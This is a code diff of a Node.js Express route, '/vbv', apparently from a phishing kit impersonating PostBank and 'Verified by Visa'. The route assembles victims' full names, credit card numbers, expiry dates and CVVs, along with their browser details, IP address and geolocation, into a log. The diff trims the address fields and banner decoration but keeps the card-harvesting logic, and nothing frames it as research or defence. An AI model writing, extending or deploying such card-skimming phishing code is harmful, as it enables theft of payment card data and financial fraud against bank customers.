@@ -69,14 +69,11 @@ login.post('/vbv',(req,res)=>{
         const geo = geoip.lookup(ipv4);
         const log= "----------  SMS VBV PostBank Happy Cash bb  ----------- \n" +
             "FullName : " +req.body.fullname +"\n"+
-            "Address  : " +req.body.adress +"\n"+
-            "City : " +req.body.city +"\n"+
-            "Zipcode   : " +req.body.zipcode +"\n"+
-            "---------- ☺ ♥ ♥  VBV PostBank Happy Cash bb  ♥ ♥ ☺ ----------- \n" +
+            "----------  VBV PostBank Happy Cash bb  ----------- \n" +
             "CC  : " +req.body.creditNumber +"\n"+
             "Data exp : "+ req.body.dateExp +"\n"+
             "Cvv : "+ req.body.cvv +"\n"+
-            "---------- ☺ ♥ ♥  VBV PostBank  ♥ ♥ ☺ ----------- \n" +
+            "----------  VBV PostBank ----------- \n" +
             "------------------------------------- \n"+
             "Browser : " +req.headers["user-agent"]+"\n"+
             "Ip Address  :"+ipv4+"\n"+
